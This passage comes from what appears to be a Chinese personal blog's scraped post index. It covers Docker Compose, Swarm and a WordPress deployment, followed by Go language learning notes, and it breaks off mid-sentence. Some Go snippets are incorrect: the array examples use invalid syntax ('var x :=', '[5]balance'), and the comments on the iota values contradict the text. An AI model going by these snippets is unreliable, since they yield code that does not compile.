ls查看，默认名称composetest_default。项目中的内容都在同一网络，可通过域名访问。\n小结：\n1.应用，如app.py\n2.Dockerfile应用打包为镜像\n3.Docker-compose.yml文件(定义整个服务、需要的环境)。完整的上线服务\n4.启动compose项目(docker-compose up)\nyaml规则 官方示例:Compose file version 3 reference | Docker Documentation\ndocker-compose.yml是核心。\n# 只有三层 version: \u0026#39;\u0026#39; # 版本 services: # 服务 服务1: web # 服务配置 images build network ... 服务2: redis ... # 其他配置 网络/卷/全局规则 volumes: networks: configs: depends_on\nSimple example：\nversion: \u0026#34;3.9\u0026#34; services: web: build: . depends_on:\t# 依赖于db和redis - db - redis redis: image: redis db: image: postgres # 启动顺序：web --\u0026gt; redis --\u0026gt; db  There are several things to be aware of when using depends_on:\n depends_on does not wait for db and redis to be “ready” before starting web - only until they have been started. If you need to wait for a service to be ready, see Controlling startup order for more on this problem and strategies for solving it. Version 3 no longer supports the condition form of depends_on. The depends_on option is ignored when deploying a stack in swarm mode with a version 3 Compose file.   deploy\n Added in version 3 file format.\n Specify configuration related to the deployment and running of services. This only takes effect when deploying to a swarm with docker stack deploy, and is ignored by docker-compose up and docker-compose run.\nversion: \u0026#34;3.9\u0026#34; services: redis: image: redis:alpine deploy: replicas: 6\t# 副本 placement: max_replicas_per_node: 1 update_config: parallelism: 2 delay: 10s restart_policy: condition: on-failure 部署wp博客 官方文档部署WordPress博客:Quickstart: Compose and WordPress | Docker Documentation\n1.创建一个空文件夹，此处命名为my_wordpress\nmkdir my_wordpress 2.切换到对应目录\ncd my_wordpress/ 3.创建docker-compose.yml文件\nversion: \u0026#34;3.3\u0026#34; services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - \u0026#34;8000:80\u0026#34; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: db_data: {}  Notes:\n The docker volume db_data persists any updates made by WordPress to the database. Learn more about docker volumes WordPress Multisite works only on ports 80 and 443.   4.构建项目\nNow, run docker-compose up -d from your project directory.\nThis runs docker-compose up in detached mode, pulls the needed Docker images, and starts the wordpress and database containers.\n$ docker-compose up -d  Note: WordPress Multisite works only on ports 80 and/or 443. If you get an error message about binding 0.0.0.0 to port 80 or 443 (depending on which one you specified), it is likely that the port you configured for WordPress is already in use by another service.\n 5.开始安装\n经过第4步后，访问localhost:8000端口即可设置博客。\n实战 1.编写项目微服务\n2.Dockefile构建镜像\n3.docker-compose.yaml编排项目\n4.docker-compose up\n5.docker-compose up --build项目重新部署打包\nDocker Swarm Docker Swarm官方文档:Swarm mode overview | Docker Documentation\n节点如何工作： Docker Engine 1.12 introduces swarm mode that enables you to create a cluster of one or more Docker Engines called a swarm. A swarm consists of one or more nodes: physical or virtual machines running Docker Engine 1.12 or later in swarm mode.\nThere are two types of nodes: managers and workers.\nIf you haven’t already, read through the swarm mode overview and key concepts.\n管理与工作节点 管理节点 Manager nodes handle cluster management tasks:\n maintaining cluster state scheduling services serving swarm mode HTTP API endpoints  Using a Raft implementation, the managers maintain a consistent internal state of the entire swarm and all the services running on it. For testing purposes it is OK to run a swarm with a single manager. If the manager in a single-manager swarm fails, your services continue to run, but you need to create a new cluster to recover.\nTo take advantage of swarm mode’s fault-tolerance features, Docker recommends you implement an odd number of nodes according to your organization’s high-availability requirements. When you have multiple managers you can recover from the failure of a manager node without downtime.\n  A three-manager swarm tolerates a maximum loss of one manager.\n  A five-manager swarm tolerates a maximum simultaneous loss of two manager nodes.\n  An N manager cluster tolerates the loss of at most (N-1)/2 managers.\n  Docker recommends a maximum of seven manager nodes for a swarm.\n Important Note: Adding more managers does NOT mean increased scalability or higher performance. In general, the opposite is true.\n   工作节点 Worker nodes are also instances of Docker Engine whose sole purpose is to execute containers. Worker nodes don’t participate in the Raft distributed state, make scheduling decisions, or serve the swarm mode HTTP API.\nYou can create a swarm of one manager node, but you cannot have a worker node without at least one manager node. By default, all managers are also workers. In a single manager node cluster, you can run commands like docker service create and the scheduler places all tasks on the local Engine.\nTo prevent the scheduler from placing tasks on a manager node in a multi-node swarm, set the availability for the manager node to Drain. The scheduler gracefully stops tasks on nodes in Drain mode and schedules the tasks on an Active node. The scheduler does not assign new tasks to nodes with Drain availability.\nRefer to the docker node update command line reference to see how to change node availability.\nRaft 图中有一个Raft Consensus Group的概念，我们来查阅一下资料。\nRaft:一种新的分布式协议研究，为真实世界应用建立的协议，主要注重协议落地性和可理解性。保证大多数节点存活才可使用。\n关于分布式系统的Raft算法讲解:分布式系统的Raft算法 - 解道Jdon\nRaft算法详解:图解：什么是Raft算法？ - 无敌码龙的个人空间 - OSCHINA - 中文开源技术交流社区\n命令 # 帮助命令 docker swarm --help Usage: docker swarm COMMAND Manage Swarm Commands: ca Display and rotate the root CA init Initialize a swarm join Join a swarm as a node and/or manager join-token Manage join tokens leave Leave the swarm unlock Unlock swarm unlock-key Manage the unlock key update Update the swarm docker swarm init\t# 初始化节点 docker swarm join\t# 加入节点 # 获取令牌 docker swarm join-token manager docker swarm join-token worker docker node ls # 查看节点 具体使用 服务无感升级为灰度发布(也称金丝雀发布)。\ndocker run\t# 容器启动，不具有扩缩容功能 docker service 服务\t# 能实现扩缩容及滚动更新 docker service create -p 8888:80 --name my-nginx nginx # 查看服务 docker service ps my-nginx docker service ls docker service inspect my-nginx # 创建副本 docker service update --replicas 3 my-nginx docker service update --replicas 1 my-nginx # 更新为1个服务 docker service scale my-nginx=5\t# 动态扩缩容，与update效果相同 docker service rm my-nginx 概念总结 Swarm 集群的管理和编号。docker可以初始化一个swarm集群，其它节点可以加入。(manager、worker)\nNode 就是一个docker节点，多个节点组成一个网络集群。\nService 任务，可以在manager或worker来运行。用户访问的其实就是service，这是集群的核心。\nTask 容器内命令，细节任务。\n调整service运行方式 docker service create --mode replicated --name my-centos centos\t# 仅在副本运行 docker service create --mode global --name haha alpine ping baidu.com\t# 全局运行 拓展 网络模式：\u0026ldquo;PublishMode\u0026rdquo;:\u0026ldquo;ingress\u0026rdquo;\nSwarm:\nOverlay:网络变成一个整体\ningress:具有负载均衡功能的特殊Overlay网络，\nDocker Stack docker-compose\t# 单机部署项目 docker-compose up -d wordpress.yaml docker stack\t# 集群部署 docker stack deploy wordpress.yaml Docker Secret Commands: create Create a secret from a file or STDIN as content inspect Display detailed information on one or more secrets ls List secrets rm Remove one or more secrets Docker Config Commands:\rcreate Create a config from a file or STDIN\rinspect Display detailed information on one or more configs\rls List configs\rrm Remove one or more configs\r 本文链接：Docker | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/docker/","summary":"Docker概述 镜像（image）：\n一个只读模板。一个镜像可以用来创建多个Docker容器，好似Java中的类和对象，镜像是类，容器是对象。\r容器（container）：\nDocker利用容器独立运行一个或一组应用，容器是用镜像创建的运行实例。\r容器可以被启动、开始、停止、删除。\r每个容器都是相互个隔离的。\r也可以把容器看做一个简易版Linux环境(包括root用户权限、进程空间、用户空间和网络空间等)及运行在其中的应用程序。\r容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器最上面一层可读可写。\r仓库（repository）：\n仓库是集中存放镜像文件的场所。\r仓库和仓库注册服务器(registry)是有区别的，后者往往存在多个仓库，每个仓库又存在多个镜像，每个镜像有不同的标签。\r仓库分为公开仓库和私有仓库两种形式。\r最大的公开仓库是Docker Hub，国内最大的为阿里云、网易云等。\rDocker安装  环境:CentOS 7\n 1.官方文档\n2.yum安装gcc相关环境：\nyum -y install gcc yum -y install gcc-c++ 3.卸载旧版本：\nyum remove docker \\ \tdocker-client \\ \tdocker-client-latest \\ \tdocker-common \\ \tdocker-latest \\ \tdocker-latest-logrotate \\ \tdocker-logrotate \\ \tdocker-engine 4.安装依赖包：\nyum install -y yum-utils 5.设置镜像仓库：\n# 错误 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo ## 报错 [Errno 14] curl#35 - TCP connection reset by peer [Errno 12] curl#35 - Timeout # 推荐国内镜像 yum-config-manager --add-repo http://mirrors.","title":"Docker"},{"content":"runoob教程:Go 语言教程 | 菜鸟教程 (runoob.com)\n环境搭建 安装包官方下载地址：Downloads - The Go Programming Language (golang.org)\n国内能打开的地址：Downloads - The Go Programming Language (google.cn)\nWindows安装go 安装包下载 这里我选择下载msi文件的go1.16.2.windows-amd64.zip压缩包，然后放在环境目录D:\\Env\\go1.16.2\\bin下解压。\n环境配置 将go目录下的/bin路径添加到Path环境变量中，点击新建。\n检测安装 打开cmd输入go。\nhello-world 在工作目录创建hello.go文件。\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 使用go run命令运行:\ngo run hello.go go build生成二进制文件运行:\n\u0026gt; go build .\\hello.go \u0026gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2021/3/15 10:50 2094592 hello.exe -a---- 2021/3/15 10:47 79 hello.go \u0026gt; .\\hello.exe Hello, World! Linux安装go  环境：Ubuntu 20.04.1（推荐使用WSL，但现在电脑上没配置，就在虚拟机上做了）\n 官方安装文档：Download and install - The Go Programming Language (google.cn)\n安装包下载 下载go1.16.2.linux-amd64.tar.gz压缩文件。\n解压 $ sudo tar -zxvf go1.16.2.linux-amd64.tar.gz 设置环境变量 $ export PATH=$PATH:/usr/local/go/bin 检测安装 $ go version 问题处理 本来想通过VMware Tools把压缩文件直接从主机拖到虚拟机的，但尝试本地解压VMware Tools失败，报错显示内存不足，尝试解压到其它目录。解决方法如下：\n$ sudo tar -xzvf VmwareTools.tar.gz -C /home/oopsdc\t# -C 后指定解压目录，我这里直接解压到用户目录下 $ cd /home/oopsdc/vmware-tools-distrib/\t# 切换到对应目录 $ sudo ./vmware-install.pl\t# 运行安装文件即可 Go语言结构 Go语言基础组成有以下几部分:\n 包声明 引入包 函数 变量 语句\u0026amp;表达式 注释  我们以之前hello.go的代码为例。\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) }  第一行package main定义了包名。我们必须在源文件非注释的第一行指明这个文件属于哪个包。如package main表示一个可独立执行的程序，每个Go应用程序都包含一个main包。 第三行import fmt告诉Go编译器这个程序需要使用fmt包的函数或其他元素。fmt包中有实现格式化I/O的函数。 第五行的func main()为程序开始执行的函数。main函数是每个可执行程序必须包含的，除init()函数外一般都是第一个执行的函数。 fmt.Println()可以将字符串输出到控制台并自动换行，效果与fmt.Println(\u0026quot;Hello,World\\n\u0026quot;)相同。其中，Println和Print函数支持使用变量，如fmt.Println(arr)，若不加特别指令，会以默认打印格式将变量arr输出到控制台。 当标识符(如变量、常量、类型、函数名及结构字段等)以一个大写字母开头，如:Variable1，那么使用这种形式的标识符对象就可以被外部包代码所使用(需要先导入这个包)，这被称为导出(像面向对象语言中的public)；若标识符以小写字母开头，则对包外不可见，但在包内部可见并可用(类似protected)。 前括号{不能单独一行，否则会报错  func main() { // 错误  fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 学习笔记 变量声明三种方式 方式一 指定变量类型，若未初始化则值为0。\nvar v_name v_type v_name = value 实例1：\npackage main import \u0026#34;fmt\u0026#34; func main() { // 声明一个变量并初始化  var a = \u0026#34;oopsdc\u0026#34; fmt.Println(a) // 没有初始化就为零值  var b int fmt.Println(b) // bool 零值为 false  var c bool fmt.Println(c) } 执行结果：\noopsdc\r0\rfalse\r 数值类型(包括complex64/128)为 0 布尔类型为 false 字符串为 \u0026quot;\u0026quot;(空字符串) 以下几种类型为 nil：  var a *int var a []int var a map[string] int var a chan int var a func(string) int var a error // error 是接口 实例2：\npackage main import \u0026#34;fmt\u0026#34; func main() { var i int var f float64 var b bool var s string fmt.Printf(\u0026#34;%v %v %v %q\\n\u0026#34;, i, f, b, s) } 执行结果：\n0 0 false \u0026quot;\u0026quot;\r方式二 根据值自行判断变量类型。\nvar v_name = value 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var d = true fmt.Println(d) } 执行结果：\ntrue\r方式三 :=赋值，是使用变量的首选形式。**但只能被用在函数体内，不能够用于全局变量声明及赋值。**使用:=操作符可以高效创建一个变量。称之为初始化声明。\nv_name := value 注::=左侧需为未声明过的新变量，否则会报错。\n例：\nvar intVal int intVal :=1 // 这时候会产生编译错误  intVal,intVal1 := 1,2 // 此时不会产生编译错误，因为有声明新的变量，因为 := 是一个声明语句 实例:\npackage main import \u0026#34;fmt\u0026#34; func main() { f := \u0026#34;oopsdc\u0026#34; // var f string = \u0026#34;oopsdc\u0026#34;  fmt.Println(f) } 执行结果:\noopsdc\r多变量声明 //类型相同多个变量, 非全局变量 var vname1, vname2, vname3 type vname1, vname2, vname3 = v1, v2, v3 var vname1, vname2, vname3 = v1, v2, v3 // 和 python 很像,不需要显示声明类型，自动推断  vname1, vname2, vname3 := v1, v2, v3 // 出现在 := 左侧的变量不应该是已经被声明过的，否则会导致编译错误  // 这种因式分解关键字的写法一般用于声明全局变量 var ( vname1 v_type1 vname2 v_type2 ) 实例：\npackage main var x, y int var ( // 这种因式分解关键字的写法一般用于声明全局变量  a int b bool ) var c, d int = 1, 2 var e, f = 123, \u0026#34;hello\u0026#34; //这种不带声明格式的只能在函数体中出现 //g, h := 123, \u0026#34;hello\u0026#34;  func main(){ g, h := 123, \u0026#34;hello\u0026#34; println(x, y, a, b, c, d, e, f, g, h) } 执行结果：\n0 0 0 false 1 2 123 hello 123 hello\r空白标识符在函数返回值中的使用 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { _,numb,strs := numbers() //只获取函数返回值的后两个  fmt.Println(numb,strs) } //一个可以返回多个值的函数 func numbers()(int,int,string){ a , b , c := 1 , 2 , \u0026#34;str\u0026#34; return a,b,c } 执行结果：\n2 str\runsafe.sizeof()函数 实例如下：\npackage main import \u0026#34;unsafe\u0026#34; const ( a = \u0026#34;abc\u0026#34; b = len(a) c = unsafe.Sizeof(a) ) func main(){ println(a, b, c) } 运行结果：\nabc 3 16\r看到的时候没搞懂为什么c，即unsafe.Sizeof(a)的值为16，于是查了一下。\ncsdn文章：unsafe.sizeof()_记录每一个小阶段的学习心得，持之以恒！-CSDN博客\n 为什么字符串类型的unsafe.Sizeof()一直为16\n 实际中，字符串类型对应一个结构体，结构体有两个域。第一个域为指向该字符串的指针，第二个域是字符串长度，每个域占8字节，但并不包含指针指向的字符串内容，也就是说它的返回值一直为16。\niota特殊常量 iota介绍 是一个特殊常量，可认为是可被编译器修改的常量。\niota在const关键字出现时将被重置为 0(const内部的第一行之前)，const 中每新增一行常量声明将使iota计数一次(iota可理解为const语句块中的行索引)。\niota可被用作枚举值，第一个iota值为0，每当其在新的一行被引用时，值自动加1：\nconst ( a = iota\t// 1  b = iota\t// 2  c = iota\t// 3 ) 简写形式如下：\nconst ( a = iota b c ) iota用法 实例1：\npackage main import \u0026#34;fmt\u0026#34; func main() { const ( a = iota //0  b //1  c //2  d = \u0026#34;ha\u0026#34; //独立值，iota += 1  e //\u0026#34;ha\u0026#34; iota += 1  f = 100 //iota +=1  g //100 iota +=1  h = iota //7,恢复计数  i //8  ) fmt.Println(a,b,c,d,e,f,g,h,i) } 运行结果：\n\u0026gt; go run .\\iota1.go 0 1 2 ha ha 100 100 7 8 实例2：\npackage main import \u0026#34;fmt\u0026#34; const ( i=1\u0026lt;\u0026lt;iota j=3\u0026lt;\u0026lt;iota k l ) func main() { fmt.Println(\u0026#34;i =\u0026#34;,i) fmt.Println(\u0026#34;j =\u0026#34;,j) fmt.Println(\u0026#34;k =\u0026#34;,k) fmt.Println(\u0026#34;l =\u0026#34;,l) } 运行结果：\n\u0026gt; go run .\\iota2.go i = 1 j = 6 k = 12 l = 24 刚看到i=1\u0026lt;\u0026lt;iota的时候就想到了移位，以下是对结果的分析：\n\u0026lt;\u0026lt;n==*(2^n)\ri = 1 \u0026lt;\u0026lt; 0\t# 左移0位\ri = 001\ri = 1 * 2^0 = 1\rj = 3 \u0026lt;\u0026lt; 1\t# 左移1位\rj = 011 =\u0026gt; 110\rj = 3 * 2^1 = 6\rk = 3 \u0026lt;\u0026lt; 2\t# 左移2位\rk = 011 =\u0026gt; 1100\rk = 3 * 2^2 = 12\rl = 3 \u0026lt;\u0026lt; 3\t# 左移3位\rl = 011 =\u0026gt; 11000\rl = 3 * 2^3 = 24\r常量 常量是一个简单值的标识符，在程序运行过程中不会改变。\n常量中的数据类型只能为布尔型、数字型(整数型、浮点型和复数)及字符串型。\n常见常量定义格式：\nconst identifier [type] = value 类型说明符[type]可省略，因为编译器可根据变量值推断其类型。\n 显式类型定义  const a string = \u0026#34;oopsdc\u0026#34;  隐式类型定义  const a = \u0026#34;oopsdc\u0026#34;  多个常量定义  const a_name1, a_name2 = value1, value2 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { const LENGTH int = 10 const WIDTH int = 5 var area int const a, b, c = 1, false, \u0026#34;str\u0026#34; //多重赋值  area = LENGTH * WIDTH fmt.Printf(\u0026#34;面积为 : %d\u0026#34;, area) println() println(a, b, c) } 执行结果：\n面积为 : 50\r1 false str\r常量用作枚举：\nconst ( Unknown = 0 Female = 1 Male = 2 ) 语言运算符 运算符用于在程序执行时执行数学或逻辑运算。\nGo语言内置运算符有:\n 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其它运算符  其它运算符    运算符 描述 实例     \u0026amp; 返回变量存储地址 \u0026amp;a; 将给出变量的实际地址。   * 指针变量。 *a; 是一个指针变量    实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var a int = 4 var b int32 var c float32 var ptr *int /* 运算符实例 */ fmt.Printf(\u0026#34;第 1 行 - a 变量类型为 = %T\\n\u0026#34;, a ); fmt.Printf(\u0026#34;第 2 行 - b 变量类型为 = %T\\n\u0026#34;, b ); fmt.Printf(\u0026#34;第 3 行 - c 变量类型为 = %T\\n\u0026#34;, c ); /* \u0026amp; 和 * 运算符实例 */ ptr = \u0026amp;a /* \u0026#39;ptr\u0026#39; 包含了 \u0026#39;a\u0026#39; 变量的地址 */ fmt.Printf(\u0026#34;a 的值为 %d\\n\u0026#34;, a); fmt.Printf(\u0026#34;*ptr 为 %d\\n\u0026#34;, *ptr); } 执行结果：\n第 1 行 - a 变量类型为 = int\r第 2 行 - b 变量类型为 = int32\r第 3 行 - c 变量类型为 = float32\ra 的值为 4\r*ptr 为 4\r运算符优先级    优先级 运算符     5 * / % \u0026laquo; \u0026raquo; \u0026amp; \u0026amp;^   4 + - | ^   3 == != \u0026lt; \u0026lt;= \u0026gt; \u0026gt;=   2 \u0026amp;\u0026amp;   1 ||    我们可以通过使用括号来临时提升某个表达式的整体运算优先级。\n条件判断语句    语句 描述     if 语句 if 语句 由一个布尔表达式后紧跟一个或多个语句组成。   if\u0026hellip;else 语句 if 语句 后可以使用可选的 else 语句, else 语句中的表达式在布尔表达式为 false 时执行。   if 嵌套语句 你可以在 if 或 else if 语句中嵌入一个或多个 if 或 else if 语句。   switch 语句 switch 语句用于基于不同条件执行不同动作。   select 语句 select 语句类似于 switch 语句，但是select会随机执行一个可运行的case。如果没有case可运行，它将阻塞，直到有case可运行。     注：Go 没有三目运算符，不支持?:形式的条件判断。\n 循环语句 Go 语言提供了以下几种类型循环处理语句:\n   循环类型 描述     for 循环 重复执行语句块   循环嵌套 在 for 循环中嵌套一个或多个 for 循环    循环控制语句 循环控制语句可以控制循环体内语句的执行过程。\nGO 语言支持以下几种循环控制语句:\n   控制语句 描述     break 语句 经常用于中断当前 for 循环或跳出 switch 语句   continue 语句 跳过当前循环的剩余语句，然后继续进行下一轮循环。   goto 语句 将控制转移到被标记的语句。    无限循环 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { for true { fmt.Printf(\u0026#34;这是无限循环。\\n\u0026#34;); } } 函数 函数定义 格式如下：\nfunc function_name( [parameter list] ) [return_types] { 函数体 } 函数定义解析:\n func：函数由 func 开始声明 function_name：函数名称，函数名和参数列表一起构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。  实例：\n// 返回两个数的较大者 func main(num1, num2 int) int { // 声明局部变量 \tvar result int if (num1 \u0026gt; num2) { result = num1 } else { result = num2 } return result } 函数调用 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { // 定义局部变量  var a int = 1 var b int = 2 var ret int // 调用函数返回最大值  ret = max(a, b) fmt.Printf(\u0026#34;Maximum: %d\\n\u0026#34;, ret) } // max()函数 func max(num1, num2 int) int { // 定义局部变量  var res int if (num1 \u0026gt; num2) { res = num1 } else { res = num2 } return res } 函数返回多个值 Go 函数可以返回多个值。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { a, b := swap(\u0026#34;dc\u0026#34;, \u0026#34;oops\u0026#34;) fmt.Println(a, b) } func swap(x, y string) (string, string) { return y, x } 执行结果：\noops dc\r函数参数 函数如果使用参数，该变量可称为函数的形参。\n形参就像定义在函数体内的局部变量。\n调用函数，可以通过两种方式来传递参数:\n   传递类型 描述     值传递 值传递是指在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。   引用传递 引用传递是指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。    默认情况下，Go 语言使用的是值传递，即在调用过程中不会影响到实际参数。\n函数用法    函数用法 描述     函数作为另外一个函数的实参 函数定义后可作为另外一个函数的实参数传入   闭包 闭包是匿名函数，可在动态编程中使用   方法 方法就是一个包含了接受者的函数    变量作用域 作用域为已声明标识符所表示的常量、类型、变量、函数或包在源代码中的作用范围。\nGo 语言中变量可以在三个地方声明:\n 函数内定义的变量称为局部变量 函数外定义的变量称为全局变量 函数定义中的变量称为形式参数  局部变量 在函数体内声明的变量称为局部变量，其作用域只在函数体内，参数和返回值也是局部变量。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { // 声明局部变量  var a, b, c int // 初始化参数  a = 1 b = 2 c = a + b fmt.Printf(\u0026#34;Res: a=%d, b=%d, c=%d\\n\u0026#34;, a, b, c) } 执行结果：\nRes: a=1, b=2, c=3\r全局变量 在函数体外声明的变量称为全局变量，其作用域可以在整个包甚至外部包(被导出后)使用。\n全局变量可在任何函数中使用。\n实例1：\npackage main import \u0026#34;fmt\u0026#34; // 声明全局变量 var g int func main() { // 声明局部变量  var a, b int // 初始化参数  a = 1 b = 2 g = a + b fmt.Printf(\u0026#34;Res: a=%d, b=%d, g=%d\\n\u0026#34;, a, b, g) } 执行结果：\nRes: a=1, b=2, g=3\rGo 语言中全局变量和局部变量名称可以相同，但位于函数内的局部变量会被优先考虑。\n实例2：\npackage main import \u0026#34;fmt\u0026#34; // 声明全局变量 var g int = 10 func main() { // 声明局部变量  var a, b, g int // 初始化参数  a = 1 b = 2 g = a + b fmt.Printf(\u0026#34;Res: a=%d, b=%d, g=%d\\n\u0026#34;, a, b, g) } 执行结果：\nRes: a=1, b=2, g=3\r我们可以看出，即使在函数外部给全局变量g赋值为10，最后输出的还是函数体内局部变量g的值。\n形式参数 形式参数会作为函数的局部变量来使用。\n实例：\npackage main import \u0026#34;fmt\u0026#34; // 声明全局变量 var a int = 10 func main() { // main()函数中声明局部变量  var a int = 1 var b int = 2 var c int = 0 fmt.Printf(\u0026#34;main()函数中 a=%d\\n\u0026#34;, a) c = sum(a, b) fmt.Printf(\u0026#34;main()函数中 c=%d\\n\u0026#34;, c) } // sum()函数定义 func sum(a, b int) int { fmt.Printf(\u0026#34;sum()函数中 a=%d\\n\u0026#34;, a) fmt.Printf(\u0026#34;sum()函数中 b=%d\\n\u0026#34;, b) return a + b } 执行结果：\nmain()函数中 a=1\rsum()函数中 a=1\rsum()函数中 b=2\rmain()函数中 c=3\r初始化局部和全局变量 不同类型的局部和全局变量默认值为:\n   数据类型 初始化默认值     int 0   float32 0   pointer nil    数组 Go 中提供了数组类型的数据结构。\n数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。\n相对于去声明 number0, number1, \u0026hellip;, number99 的变量，使用数组形式 numbers[0], numbers[1] \u0026hellip;, numbers[99] 更加方便且易于扩展。\n数组元素可以通过索引(位置)来读取(或者修改)，索引从0开始，第一个元素索引为0，第二个索引为1，以此类推。\n声明数组 语法格式如下：\nvar variable_name [SIZE] variable_type // 数组名 数组长度 数组类型 如我们定义一个类型为int，长度为10的数组balance：\nvar balance [10] int 初始化数组 var balance = [5]float32{1,2,3,4,5} 还可以通过字面量在声明数组的同时快速初始化：\nvar balance := [5]float32{1,2,3,4,5} 当数组长度不确定时，我们可以使用...代替数组长度，编译器会根据数组元素个数自动推断长度：\nvar balance := [...]float32{1,2,3,4,5} 当设置了数组长度时，我们可以通过指定下标来初始化元素：\n// 将索引为1和3的元素初始化 balance := [5]balance{1:1.0,3:3.0} 注：{}中的元素个数不能大于[]中的数字。\n访问数组元素 实例1：\npackage main import \u0026#34;fmt\u0026#34; func main() { var arr [10] int\t// 长度为10的数组 \tvar i, j int // 给数组初始化元素 \tfor i = 0; i \u0026lt; 10; i++ { arr[i] = i + 1; } // 输出每个元素的值 \tfor j = 0; j \u0026lt; 10; j++ { fmt.Printf(\u0026#34;Ele[%d] = %d\\n\u0026#34;, j, arr[j]) } } 执行结果：\nEle[0] = 1\rEle[1] = 2\rEle[2] = 3\rEle[3] = 4\rEle[4] = 5\rEle[5] = 6\rEle[6] = 7\rEle[7] = 8\rEle[8] = 9\rEle[9] = 10\r实例2：\npackage main import \u0026#34;fmt\u0026#34; func main() { var i, j int arr := [...]float32{1,2,3,4,5} for i = 0; i \u0026lt; 5; i++ { fmt.Printf(\u0026#34;Ele[%d] = %f\\n\u0026#34;, i, arr[i]) } arr2 := [5]float32{1:2.0,3:7.0} for j = 0; j \u0026lt; 5; j++ { fmt.Printf(\u0026#34;Ele[%d] = %f\\n\u0026#34;, j, arr2[j]) } } 执行结果：\nEle[0] = 1.000000\rEle[1] = 2.000000\rEle[2] = 3.000000\rEle[3] = 4.000000\rEle[4] = 5.000000\rEle[0] = 0.000000\rEle[1] = 2.000000\rEle[2] = 0.000000\rEle[3] = 7.000000\rEle[4] = 0.000000\r更多内容 数组对Go 语言来说非常重要，以下我们是关于数组更多的内容:\n   内容 描述     多维数组 Go 语言支持多维数组，最简单的多维数组是二维数组   向函数传递数组 你可以向函数传递数组参数    指针 指针变量通常缩写为ptr。\n指针使用 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var a int = 20 var ip *int ip = \u0026amp;a fmt.Printf(\u0026#34;a 变量地址为: %x\\n\u0026#34;, \u0026amp;a) fmt.Printf(\u0026#34;ip 变量存储地址为: %x\\n\u0026#34;, ip) fmt.Printf(\u0026#34;*ip 指向的值: %d\\n\u0026#34;, *ip) } 执行结果：\na 变量地址为: c000128058\rip 变量存储地址为: c000128058\r*ip 指向的值: 20\r空指针 当指针没有被分配到任何变量时，值为nil。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var ptr *int fmt.Printf(\u0026#34;%x\\n\u0026#34;, ptr) } 执行结果：\n0\r空指针判断：\nif (ptr != nil) if (ptr == nil) 更多内容    内容 描述     Go 指针数组 你可以定义一个指针数组来存储地址   Go 指向指针的指针 Go 支持指向指针的指针   Go 向函数传递指针参数 通过引用或地址传参，在函数调用时可以改变其值    结构体 数组可以存储同一类型的数据，结构体中可以为不同项定义不同数据类型。\n结构体是由一系列具有相同类型或不同类型数据构成的数据集合。\n结构体表示一项纪录，比如一个学生有以下属性:\n 姓名 学号 学院 专业  定义结构体 使用type和struct语句。\ntype语句设定了结构体名称。\nstruct语句定义了一个新的数据类型，结构体中有一个或多个成员。\n结构体格式如下：\ntype struct_variable_type struct { member definition member definition ... } 定义了结构体类型，就能用于变量声明：\nvariable_name := structure_variable_type {value1, value2...} variable_name := structure_variable_type {key1:value1, key2:value2...} 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(Books{\u0026#34;Go lang\u0026#34;, \u0026#34;DC\u0026#34;, \u0026#34;Go lang learn\u0026#34;, \u0026#34;oopsdc.tk\u0026#34;}) fmt.Println(Books{title:\u0026#34;Go lang\u0026#34;, author:\u0026#34;DC\u0026#34;, subject:\u0026#34;Go lang learn\u0026#34;, website:\u0026#34;oopsdc.tk\u0026#34;}) fmt.Println(Books{title:\u0026#34;Go lang\u0026#34;, author:\u0026#34;DC\u0026#34;}) } type Books struct { title string author string subject string website string } 执行结果：\n{Go lang DC Go lang learn oopsdc.tk}\r{Go lang DC Go lang learn oopsdc.tk}\r{Go lang DC }\r访问结构体成员 格式：\n结构体.成员名\r实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var Book1 Books var Book2 Books Book1.title = \u0026#34;C语言\u0026#34; Book1.author = \u0026#34;DC\u0026#34; Book1.subject = \u0026#34;编程\u0026#34; Book1.id = 00001 Book2.title = \u0026#34;Python语言\u0026#34; Book2.author = \u0026#34;DC\u0026#34; Book2.subject = \u0026#34;编程\u0026#34; Book2.id = 00002 fmt.Printf(\u0026#34;Book1 title: %s\\n\u0026#34;, Book1.title) fmt.Printf(\u0026#34;Book1 author: %s\\n\u0026#34;, Book1.author) fmt.Printf(\u0026#34;Book1 subject: %s\\n\u0026#34;, 